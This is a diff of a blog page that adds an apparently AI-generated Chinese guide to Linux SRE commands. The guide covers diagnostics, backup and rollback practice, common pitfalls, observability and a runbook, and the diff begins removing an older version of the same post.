@@ -184,6 +184,82 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2026/09/19/2026-09-19-expanded-blog-linux%E5%91%BD%E4%BB%A4/">
+                [expanded] [blog] Linux命令
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="expanded-blog-Linux命令"><a href="#expanded-blog-Linux命令" class="headerlink" title="[expanded] [blog] Linux命令"></a>[expanded] [blog] Linux命令</h1><blockquote>
+<p>原始问题: [blog] Linux命令</p>
+</blockquote>
+<h1 id="Linux-系统运维核心命令体系与生产实践"><a href="#Linux-系统运维核心命令体系与生产实践" class="headerlink" title="Linux 系统运维核心命令体系与生产实践"></a>Linux 系统运维核心命令体系与生产实践</h1><h2 id="一、背景：为什么-SRE-必须精通-Linux-命令体系"><a href="#一、背景：为什么-SRE-必须精通-Linux-命令体系" class="headerlink" title="一、背景：为什么 SRE 必须精通 Linux 命令体系"></a>一、背景：为什么 SRE 必须精通 Linux 命令体系</h2><p>在现代云原生架构中，无论是容器编排平台（Kubernetes）还是传统虚拟机集群，底层操作系统仍然是 Linux。当生产环境出现 CPU 飙升、内存泄漏、磁盘 I&#x2F;O 瓶颈或网络丢包时，GUI 监控工具往往只能提供表象数据，真正的根因分析必须依赖命令行工具深入内核层面。典型场景包括：容器 OOM Killed 需要通过 <code>dmesg</code> 和 <code>journalctl</code> 追溯内核日志；微服务间调用超时需要用 <code>ss</code> 和 <code>lsof</code> 排查 TCP 连接状态；数据库慢查询可能源于磁盘 IOPS 耗尽，需结合 <code>iostat</code> 和 <code>sar</code> 定位。</p>
+<p>Linux 文件系统层次标准（FHS）定义了关键目录的职责边界：<code>/var/log</code> 存储应用日志但会快速膨胀导致磁盘满；<code>/proc</code> 和 <code>/sys</code> 是内核暴露的虚拟文件系统，实时反映进程状态和硬件信息；<code>/etc</code> 保存配置文件，误操作可能导致服务无法启动。理解这些目录的语义是故障排查的基础，例如当 <code>df -h</code> 显示根分区使用率 100% 时，需要快速定位是 <code>/var/log</code> 日志堆积还是 <code>/tmp</code> 临时文件未清理。</p>
+<p>生产环境的复杂性在于多租户、高并发和分布式特性。单个节点可能运行数百个容器，进程树深度超过 10 层；网络拓扑涉及 VXLAN 隧道、iptables 规则链和 BGP 路由；存储层可能是 Ceph 分布式存储或云厂商的块存储服务。这要求 SRE 不仅会用命令，更要理解命令背后的系统调用、内核机制和性能开销，避免在高负载时执行 <code>find /</code> 这类会触发全盘扫描的操作。</p>
+<h2 id="二、诊断步骤：只读命令的黄金-5-分钟"><a href="#二、诊断步骤：只读命令的黄金-5-分钟" class="headerlink" title="二、诊断步骤：只读命令的黄金 5 分钟"></a>二、诊断步骤：只读命令的黄金 5 分钟</h2><p>故障响应的第一原则是 <strong>非侵入式观测</strong>，避免执行任何可能改变系统状态的操作。标准诊断流程从全局视图开始，逐步聚焦到具体资源：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 系统负载与运行时长</span></span><br><span class="line"><span class="built_in">uptime</span>  <span class="comment"># 查看 1/5/15 分钟平均负载，超过 CPU 核数表示调度队列积压</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. CPU 与内存快照</span></span><br><span class="line">top -bn1 | <span class="built_in">head</span> -20  <span class="comment"># 批处理模式获取进程 CPU 排序，避免交互式干扰</span></span><br><span class="line">free -h &amp;&amp; <span class="built_in">cat</span> /proc/meminfo | grep -E <span class="string">&#x27;MemAvailable|Slab&#x27;</span>  <span class="comment"># 可用内存与内核缓存</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 磁盘 I/O 与空间</span></span><br><span class="line"><span class="built_in">df</span> -hT &amp;&amp; iostat -xz 1 3  <span class="comment"># 文件系统类型、挂载点使用率、设备级 IOPS 与延迟</span></span><br><span class="line">lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,FSTYPE  <span class="comment"># 块设备拓扑</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 网络连接状态</span></span><br><span class="line">ss -antp | grep ESTAB | <span class="built_in">wc</span> -l  <span class="comment"># TCP 连接数统计</span></span><br><span class="line">netstat -s | grep -E <span class="string">&#x27;retransmit|overflow&#x27;</span>  <span class="comment"># 重传与队列溢出计数器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 进程与文件句柄</span></span><br><span class="line">ps auxf --<span class="built_in">sort</span>=-%mem | <span class="built_in">head</span> -20  <span class="comment"># 内存占用 TOP20，树状显示父子关系</span></span><br><span class="line">lsof -nP | <span class="built_in">wc</span> -l &amp;&amp; <span class="built_in">cat</span> /proc/sys/fs/file-nr  <span class="comment"># 当前打开文件数 vs 系统限制</span></span><br></pre></td></tr></table></figure>
+
+<p>针对特定异常的深度诊断需要结合多个维度。例如应用响应慢，先用 <code>sar -u 1 10</code> 确认 CPU 是否存在 <code>%iowait</code> 高企（表示等待磁盘 I&#x2F;O），再用 <code>pidstat -d 1</code> 定位具体进程的读写速率，最后通过 <code>lsof -p &lt;PID&gt;</code> 查看该进程打开的文件描述符，判断是否在频繁读取大文件或等待网络 socket。</p>
+<p>内存问题的诊断需要区分物理内存不足与内存泄漏。<code>free</code> 命令的 <code>available</code> 列才是真实可用内存（包含可回收的 cache），而 <code>used</code> 列包含了文件系统缓存。若 <code>available</code> 持续下降且伴随 <code>si/so</code>（swap in&#x2F;out）非零，说明发生了页面交换，需用 <code>vmstat 1</code> 监控交换频率，并通过 <code>smem -tk</code> 或 <code>pmap -x &lt;PID&gt;</code> 分析进程的 PSS（Proportional Set Size）内存占用。</p>
+<h2 id="三、正解：变更操作的三段式标准"><a href="#三、正解：变更操作的三段式标准" class="headerlink" title="三、正解：变更操作的三段式标准"></a>三、正解：变更操作的三段式标准</h2><h3 id="3-1-备份：不可逆操作的前置保险"><a href="#3-1-备份：不可逆操作的前置保险" class="headerlink" title="3.1 备份：不可逆操作的前置保险"></a>3.1 备份：不可逆操作的前置保险</h3><p>任何修改配置文件、调整内核参数或变更用户权限的操作，都必须先创建可回溯的备份点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件备份（带时间戳）</span></span><br><span class="line"><span class="built_in">cp</span> /etc/ssh/sshd_config&#123;,.bak.$(<span class="built_in">date</span> +%Y%m%d_%H%M%S)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键目录快照（使用 rsync 保留权限与时间戳）</span></span><br><span class="line">rsync -a --link-dest=/backup/etc.last /etc/ /backup/etc.$(<span class="built_in">date</span> +%F)/</span><br><span class="line"></span><br><span class="line"><span class="comment"># iptables 规则导出</span></span><br><span class="line">iptables-save &gt; /root/iptables.rules.$(<span class="built_in">date</span> +%s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户与组信息</span></span><br><span class="line">getent passwd &gt; /backup/passwd.bak &amp;&amp; getent group &gt; /backup/group.bak</span><br></pre></td></tr></table></figure>
+
+<p>对于生产数据库或存储服务，需要验证备份的完整性。例如备份 MySQL 配置后，应执行 <code>mysqld --help --verbose | grep -A1 &#39;Default options&#39;</code> 确认配置文件路径，并用 <code>diff</code> 对比备份文件与当前文件的差异。LVM 快照是文件系统级备份的利器，可在秒级创建一致性快照：<code>lvcreate -L 10G -s -n snap_root /dev/vg0/root</code>。</p>
+<h3 id="3-2-执行：幂等性与原子性保障"><a href="#3-2-执行：幂等性与原子性保障" class="headerlink" title="3.2 执行：幂等性与原子性保障"></a>3.2 执行：幂等性与原子性保障</h3><p>变更操作需要遵循幂等原则，即多次执行结果一致，避免因重试导致状态混乱：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户管理（id 命令先检查用户是否存在）</span></span><br><span class="line"><span class="built_in">id</span> appuser &amp;&gt;/dev/null || useradd -m -s /bin/bash -u 5000 appuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件权限修正（仅当权限不符时才执行）</span></span><br><span class="line">[[ $(<span class="built_in">stat</span> -c %a /opt/app) != <span class="string">&quot;750&quot;</span> ]] &amp;&amp; <span class="built_in">chmod</span> 750 /opt/app</span><br><span class="line"></span><br><span class="line"><span class="comment"># 软链接创建（-f 强制覆盖，-n 避免解引用）</span></span><br><span class="line"><span class="built_in">ln</span> -sfn /usr/local/app-v2 /usr/local/app</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内核参数调整（sysctl -w 立即生效，写入配置持久化）</span></span><br><span class="line">sysctl -w net.ipv4.tcp_tw_reuse=1</span><br><span class="line">grep -q <span class="string">&#x27;^net.ipv4.tcp_tw_reuse&#x27;</span> /etc/sysctl.conf || \</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&#x27;net.ipv4.tcp_tw_reuse=1&#x27;</span> &gt;&gt; /etc/sysctl.conf</span><br></pre></td></tr></table></figure>
+
+<p>对于服务重启等高风险操作，需要先验证配置语法。Nginx 提供 <code>nginx -t</code> 测试配置，systemd 服务可用 <code>systemd-analyze verify app.service</code> 检查单元文件。变更窗口期应启用审计日志：<code>auditctl -w /etc/nginx/nginx.conf -p wa -k nginx_config_change</code>，所有修改会记录到 <code>/var/log/audit/audit.log</code>。</p>
+<h3 id="3-3-回滚：快速恢复的预案机制"><a href="#3-3-回滚：快速恢复的预案机制" class="headerlink" title="3.3 回滚：快速恢复的预案机制"></a>3.3 回滚：快速恢复的预案机制</h3><p>回滚方案必须在变更前明确，并通过演练验证可行性：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件回滚（保留最近 3 个版本）</span></span><br><span class="line"><span class="built_in">ls</span> -t /etc/ssh/sshd_config.bak.* | <span class="built_in">tail</span> -n +4 | xargs <span class="built_in">rm</span> -f</span><br><span class="line"><span class="built_in">cp</span> /etc/ssh/sshd_config.bak.20240115_143022 /etc/ssh/sshd_config</span><br><span class="line">systemctl reload sshd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 软件包降级（CentOS/RHEL）</span></span><br><span class="line">yum <span class="built_in">history</span> list  <span class="comment"># 查看事务 ID</span></span><br><span class="line">yum <span class="built_in">history</span> undo 42  <span class="comment"># 回滚指定事务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内核参数即时回退</span></span><br><span class="line">sysctl -w net.core.somaxconn=128  <span class="comment"># 恢复默认值</span></span><br><span class="line">sysctl -p  <span class="comment"># 重新加载 /etc/sysctl.conf</span></span><br></pre></td></tr></table></figure>
+
+<p>对于数据库迁移或大规模配置变更，建议采用蓝绿部署策略。例如修改 HAProxy 配置时，先在备用节点验证新配置，通过健康检查后再切换流量，保留旧节点作为回滚目标。Git 管理配置文件是最佳实践：<code>etckeeper</code> 工具可自动将 <code>/etc</code> 纳入版本控制，每次 <code>apt/yum</code> 操作都会自动提交变更。</p>
+<h2 id="四、常见坑：生产环境的-5-个典型陷阱"><a href="#四、常见坑：生产环境的-5-个典型陷阱" class="headerlink" title="四、常见坑：生产环境的 5 个典型陷阱"></a>四、常见坑：生产环境的 5 个典型陷阱</h2><h3 id="4-1-误判：df-与-du-的数据不一致"><a href="#4-1-误判：df-与-du-的数据不一致" class="headerlink" title="4.1 误判：df 与 du 的数据不一致"></a>4.1 误判：df 与 du 的数据不一致</h3><p>现象：<code>df -h</code> 显示磁盘使用 90%，但 <code>du -sh /*</code> 累加后只有 50%。根因是进程持有已删除文件的文件描述符，磁盘空间未释放。诊断命令：<code>lsof | grep deleted</code>，找到对应进程后需重启服务或发送 <code>kill -HUP</code> 信号触发日志轮转。典型场景是应用日志被 <code>rm</code> 删除但进程未关闭文件句柄，或 Docker 容器删除后 overlay2 层未清理。</p>
+<h3 id="4-2-踩坑：find-命令引发的-I-O-风暴"><a href="#4-2-踩坑：find-命令引发的-I-O-风暴" class="headerlink" title="4.2 踩坑：find 命令引发的 I&#x2F;O 风暴"></a>4.2 踩坑：find 命令引发的 I&#x2F;O 风暴</h3><p>在根目录执行 <code>find / -name &quot;*.log&quot;</code> 会遍历所有挂载点，包括网络文件系统（NFS）和 <code>/proc</code>、<code>/sys</code> 虚拟文件系统，导致大量无效 I&#x2F;O。正确做法是限定搜索路径并排除特殊目录：<code>find /var/log -maxdepth 3 -name &quot;*.log&quot; -mtime +7</code>。生产环境应优先使用 <code>locate</code> 命令（基于预建索引）或 <code>mlocate</code> 数据库，但需注意索引更新频率（默认每日凌晨）。</p>
+<h3 id="4-3-误判：top-命令的-CPU-百分比陷阱"><a href="#4-3-误判：top-命令的-CPU-百分比陷阱" class="headerlink" title="4.3 误判：top 命令的 CPU 百分比陷阱"></a>4.3 误判：top 命令的 CPU 百分比陷阱</h3><p><code>top</code> 显示的 <code>%CPU</code> 是多核累加值，单进程可能超过 100%（如 4 核机器上某进程显示 350% 表示占用 3.5 个核）。判断是否 CPU 瓶颈需结合 <code>load average</code> 与核心数对比，以及 <code>%wa</code>（I&#x2F;O 等待）和 <code>%st</code>（虚拟化窃取时间）。云主机上 <code>%st</code> 持续高于 10% 说明宿主机超卖严重，需联系云厂商或迁移实例。</p>
+<h3 id="4-4-踩坑：kill-9-导致的资源泄漏"><a href="#4-4-踩坑：kill-9-导致的资源泄漏" class="headerlink" title="4.4 踩坑：kill -9 导致的资源泄漏"></a>4.4 踩坑：kill -9 导致的资源泄漏</h3><p><code>kill -9</code> 发送 SIGKILL 信号强制终止进程，但无法触发应用的清理逻辑（如释放文件锁、关闭数据库连接、删除 PID 文件）。正确流程是先发送 <code>SIGTERM</code>（<code>kill &lt;PID&gt;</code>）等待 30 秒，再升级为 <code>SIGKILL</code>。对于 Java 应用，应使用 <code>jstack</code> 获取线程堆栈后再决定是否强杀，避免丢失故障现场。</p>
+<h3 id="4-5-误判：netstat-的-TIME-WAIT-恐慌"><a href="#4-5-误判：netstat-的-TIME-WAIT-恐慌" class="headerlink" title="4.5 误判：netstat 的 TIME_WAIT 恐慌"></a>4.5 误判：netstat 的 TIME_WAIT 恐慌</h3><p>大量 <code>TIME_WAIT</code> 状态连接（如 10000+）常被误认为异常，实际上这是 TCP 主动关闭方的正常状态，持续 2MSL（约 60 秒）。真正需要关注的是 <code>CLOSE_WAIT</code>（被动关闭方未调用 <code>close()</code>，通常是应用 bug）和 <code>SYN_RECV</code>（可能遭受 SYN Flood 攻击）。调整 <code>net.ipv4.tcp_tw_reuse=1</code> 可复用 TIME_WAIT 连接，但需确保时间戳选项开启（<code>net.ipv4.tcp_timestamps=1</code>）。</p>
+<h2 id="五、架构建议：命令行工具的可观测性集成"><a href="#五、架构建议：命令行工具的可观测性集成" class="headerlink" title="五、架构建议：命令行工具的可观测性集成"></a>五、架构建议：命令行工具的可观测性集成</h2><h3 id="5-1-灰度变更与金丝雀验证"><a href="#5-1-灰度变更与金丝雀验证" class="headerlink" title="5.1 灰度变更与金丝雀验证"></a>5.1 灰度变更与金丝雀验证</h3><p>在多节点集群中执行命令变更时，应采用分批策略。例如修改 sysctl 参数，先在 1% 节点（金丝雀）执行并观察 5 分钟，监控指标包括：TCP 重传率（<code>netstat -s | grep retransmit</code>）、连接建立延迟（<code>ss -ti</code> 查看 RTT）、应用错误日志。通过 Ansible 或 SaltStack 实现自动化时，需设置 <code>serial: 10%</code> 限制并发度，并在每批次后插入健康检查：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Update</span> <span class="string">sysctl</span> <span class="string">parameters</span></span><br><span class="line">  <span class="attr">sysctl:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">net.core.somaxconn</span></span><br><span class="line">    <span class="attr">value:</span> <span class="number">4096</span></span><br><span class="line">    <span class="attr">sysctl_set:</span> <span class="literal">yes</span></span><br><span class="line">  <span class="attr">serial:</span> <span class="string">&quot;10%&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Wait</span> <span class="string">for</span> <span class="string">service</span> <span class="string">health</span></span><br><span class="line">  <span class="attr">uri:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;http://<span class="template-variable">&#123;&#123; inventory_hostname &#125;&#125;</span>:8080/health&quot;</span></span><br><span class="line">    <span class="attr">status_code:</span> <span class="number">200</span></span><br><span class="line">  <span class="attr">retries:</span> <span class="number">6</span></span><br><span class="line">  <span class="attr">delay:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-命令审计与-SLO-关联"><a href="#5-2-命令审计与-SLO-关联" class="headerlink" title="5.2 命令审计与 SLO 关联"></a>5.2 命令审计与 SLO 关联</h3><p>将关键命令的执行纳入 SLO 监控体系。例如定义 SLI（Service Level Indicator）：磁盘清理操作（<code>find /var/log -mtime +30 -delete</code>）必须在 5 分钟内完成，否则触发告警。使用 <code>time</code> 命令包装操作并导出指标到 Prometheus：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start=$(<span class="built_in">date</span> +%s)</span><br><span class="line">find /var/log -name <span class="string">&quot;*.log&quot;</span> -mtime +30 -delete</span><br><span class="line">duration=$(($(date +%s) - start))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;disk_cleanup_duration_seconds <span class="variable">$duration</span>&quot;</span> | curl --data-binary @- \</span><br><span class="line">  http://pushgateway:9091/metrics/job/cleanup</span><br></pre></td></tr></table></figure>
+
+<p>对于影响用户请求的操作（如 Nginx reload），需测量 P99 延迟变化。通过 <code>strace -c -p &lt;PID&gt;</code> 统计系统调用耗时，识别 <code>futex</code>（锁竞争）或 <code>recvfrom</code>（网络等待）的热点，指导性能优化。</p>
+<h3 id="5-3-只读命令的性能开销评估"><a href="#5-3-只读命令的性能开销评估" class="headerlink" title="5.3 只读命令的性能开销评估"></a>5.3 只读命令的性能开销评估</h3><p>即使是诊断命令也可能影响生产。<code>strace</code> 会使进程慢 10-100 倍，<code>tcpdump</code> 在高流量下消耗大量 CPU。建议使用 eBPF 工具（如 <code>bpftrace</code>）实现低开销追踪：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统计进程系统调用延迟分布（开销 &lt; 1%）</span></span><br><span class="line">bpftrace -e <span class="string">&#x27;tracepoint:raw_syscalls:sys_enter /comm == &quot;nginx&quot;/ &#123; @start[tid] = nsecs; &#125;</span></span><br><span class="line"><span class="string">             tracepoint:raw_syscalls:sys_exit /@start[tid]/ &#123;</span></span><br><span class="line"><span class="string">               @latency = hist(nsecs - @start[tid]); delete(@start[tid]); &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于 <code>lsof</code> 和 <code>netstat</code> 等需要遍历 <code>/proc</code> 的命令，在容器密集场景下可能耗时数秒。替代方案是直接读取 <code>/proc/net/tcp</code> 并解析十六进制地址，或使用 <code>ss -antp</code> 替代 <code>netstat</code>（性能提升 10 倍）。</p>
+<h2 id="六、参考-Runbook：按场景分类的命令库"><a href="#六、参考-Runbook：按场景分类的命令库" class="headerlink" title="六、参考 Runbook：按场景分类的命令库"></a>六、参考 Runbook：按场景分类的命令库</h2><h3 id="6-1-应急响应（5-分钟内必须执行）"><a href="#6-1-应急响应（5-分钟内必须执行）" class="headerlink" title="6.1 应急响应（5 分钟内必须执行）"></a>6.1 应急响应（5 分钟内必须执行）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 快速定位资源瓶颈</span></span><br><span class="line">dstat -tcndylp --top-cpu --top-mem 5  <span class="comment"># 综合视图：时间、CPU、网络、磁盘、负载、进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 识别僵尸进程与 D 状态进程</span></span><br><span class="line">ps aux | awk <span class="string">&#x27;$8==&quot;Z&quot; || $8~/^D/ &#123;print&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看最近的内核错误</span></span><br><span class="line">dmesg -T --level=err,crit,alert,emerg | <span class="built_in">tail</span> -50</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络连接异常排查</span></span><br><span class="line">ss -s  <span class="comment"># 连接状态统计摘要</span></span><br><span class="line">ss -tan <span class="string">&#x27;state time-wait&#x27;</span> | <span class="built_in">wc</span> -l  <span class="comment"># TIME_WAIT 计数</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-容量规划（周期性采集）"><a href="#6-2-容量规划（周期性采集）" class="headerlink" title="6.2 容量规划（周期性采集）"></a>6.2 容量规划（周期性采集）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CPU 利用率历史趋势（需 sysstat 包）</span></span><br><span class="line">sar -u -f /var/log/sa/sa$(<span class="built_in">date</span> +%d -d <span class="string">&#x27;1 day ago&#x27;</span>) | grep Average</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存分配详情</span></span><br><span class="line">slabtop -o  <span class="comment"># 内核 slab 缓存排序</span></span><br><span class="line"><span class="built_in">cat</span> /proc/buddyinfo  <span class="comment"># 伙伴系统碎片化程度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 磁盘 IOPS 与吞吐量基线</span></span><br><span class="line">iostat -xz 1 60 | awk <span class="string">&#x27;/^sd/ &#123;print $1,$4,$5,$6,$14&#125;&#x27;</span>  <span class="comment"># 设备、r/s、w/s、rkB/s、await</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-安全审计（合规检查）"><a href="#6-3-安全审计（合规检查）" class="headerlink" title="6.3 安全审计（合规检查）"></a>6.3 安全审计（合规检查）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找 SUID/SGID 文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f \( -perm -4000 -o -perm -2000 \) -<span class="built_in">ls</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最近登录失败记录</span></span><br><span class="line">lastb -n 20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查异常定时任务</span></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(<span class="built_in">cut</span> -f1 -d: /etc/passwd); <span class="keyword">do</span> crontab -u <span class="variable">$user</span> -l 2&gt;/dev/null; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开放端口与监听进程</span></span><br><span class="line">ss -tlnp | awk <span class="string">&#x27;NR&gt;1 &#123;print $4,$6&#125;&#x27;</span> | column -t</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-4-性能剖析（深度诊断）"><a href="#6-4-性能剖析（深度诊断）" class="headerlink" title="6.4 性能剖析（深度诊断）"></a>6.4 性能剖析（深度诊断）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程级 I/O 统计</span></span><br><span class="line">pidstat -d 1 10  <span class="comment"># 每秒磁盘读写速率</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP 重传与丢包分析</span></span><br><span class="line">nstat -az | grep -E <span class="string">&#x27;TcpRetransSegs|TcpExtTCPLostRetransmit&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件系统缓存命中率</span></span><br><span class="line"><span class="built_in">cat</span> /proc/meminfo | awk <span class="string">&#x27;/^Cached:|^Buffers:/ &#123;sum+=$2&#125; END &#123;print sum/1024 &quot; MB&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中断分布（识别网卡中断不均）</span></span><br><span class="line"><span class="built_in">cat</span> /proc/interrupts | grep -E <span class="string">&#x27;CPU0|eth0&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>所有命令在执行前应通过 <code>--help</code> 或 <code>man</code> 确认参数语义，避免因版本差异导致非预期行为。建议在测试环境构建命令沙盒，使用 <code>script</code> 命令记录完整操作日志：<code>script -t 2&gt;timing.log -a output.log</code>，事后可通过 <code>scriptreplay</code> 回放操作过程。</p>
+<hr>
+<p><em>by claude-sonnet-5 nightly expand · 2026-09-19</em></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2026/09/19/2026-09-19-expanded-blog-ollama/">
                 [expanded] [blog] Ollama
             </a>
@@ -298,356 +374,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/2026-09-19-expanded-blog-linux%E5%91%BD%E4%BB%A4/">
-                [expanded] [blog] Linux命令
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="expanded-blog-Linux命令"><a href="#expanded-blog-Linux命令" class="headerlink" title="[expanded] [blog] Linux命令"></a>[expanded] [blog] Linux命令</h1><blockquote>
-<p>原始问题: [blog] Linux命令</p>
-</blockquote>
-<h1 id="Linux-系统运维核心命令实战指南"><a href="#Linux-系统运维核心命令实战指南" class="headerlink" title="Linux 系统运维核心命令实战指南"></a>Linux 系统运维核心命令实战指南</h1><h2 id="一、背景与适用场景"><a href="#一、背景与适用场景" class="headerlink" title="一、背景与适用场景"></a>一、背景与适用场景</h2><p>在生产环境中，SRE 需要快速定位系统瓶颈、诊断故障并执行变更操作。典型场景包括：应用响应缓慢需要排查 CPU&#x2F;内存&#x2F;磁盘 IO 瓶颈；网络连接异常需要追踪路由和端口占用；进程异常退出需要分析日志和资源限制；磁盘空间告警需要清理和扩容；用户权限问题导致服务启动失败。</p>
-<p>Linux 命令行工具是第一响应手段，相比 GUI 监控系统具有更低延迟、更精确的数据采集能力。掌握命令组合使用（管道、重定向、过滤）可将诊断效率提升 10 倍以上。本文聚焦生产环境高频使用的命令集，按故障诊断流程组织，强调只读验证优先原则。</p>
-<p>关键原则：先观察后操作，先备份后变更，先局部后全局。所有破坏性操作必须在测试环境验证，生产环境需要 change ticket 和 rollback 预案。</p>
-<h2 id="二、系统信息诊断（只读验证阶段）"><a href="#二、系统信息诊断（只读验证阶段）" class="headerlink" title="二、系统信息诊断（只读验证阶段）"></a>二、系统信息诊断（只读验证阶段）</h2><h3 id="2-1-基础环境快速检查"><a href="#2-1-基础环境快速检查" class="headerlink" title="2.1 基础环境快速检查"></a>2.1 基础环境快速检查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 内核与发行版信息（排查兼容性问题）</span></span><br><span class="line"><span class="built_in">uname</span> -a &amp;&amp; <span class="built_in">cat</span> /etc/os-release</span><br><span 